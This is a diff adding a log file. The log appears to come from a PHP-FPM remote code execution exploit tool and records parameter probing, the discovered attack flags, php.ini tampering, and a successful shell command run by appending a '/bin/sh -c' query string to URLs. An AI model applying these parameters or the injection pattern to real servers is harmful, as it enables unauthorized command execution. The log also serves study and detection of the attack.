@@ -1,0 +1,80 @@
+2026/10/23 11:08:52 Base status code is 301
+2026/10/23 11:08:52 Status code 502 for qsl=1760, adding as a candidate
+2026/10/23 11:08:52 The target is probably vulnerable. Possible QSLs: [1750 1755 1760]
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:2}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:4}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:6}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:8}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:10}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:12}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:14}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:16}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:18}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:20}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:22}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:24}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:26}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:28}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:30}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:32}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:34}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:36}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:38}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:40}
+2026/10/23 11:08:52 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:42}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:44}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:46}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:48}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:50}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:52}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:54}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:56}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:58}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:60}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:62}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:64}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:66}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:68}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:70}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:72}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:74}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:76}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:78}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:80}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:82}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:84}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:86}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:88}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:90}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:92}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:94}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:96}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:98}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:100}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:102}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:104}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:106}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:108}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:110}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:112}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:114}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:116}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:118}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:120}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:122}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:124}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:126}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:128}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:130}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:132}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:134}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:136}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:138}
+2026/10/23 11:08:53 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:140}
+2026/10/23 11:08:54 Attack params found: --qsl 1750 --pisos 208 --skip-detect
+2026/10/23 11:08:54 Trying to set "session.auto_start=0"...
+2026/10/23 11:08:54 Detect() returned attack params: --qsl 1750 --pisos 208 --skip-detect <-- REMEMBER THIS
+2026/10/23 11:08:54 Performing attack using php.ini settings...
+2026/10/23 11:08:54 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
+2026/10/23 11:08:54 Trying to cleanup /tmp/a...
+2026/10/23 11:08:54 Done!
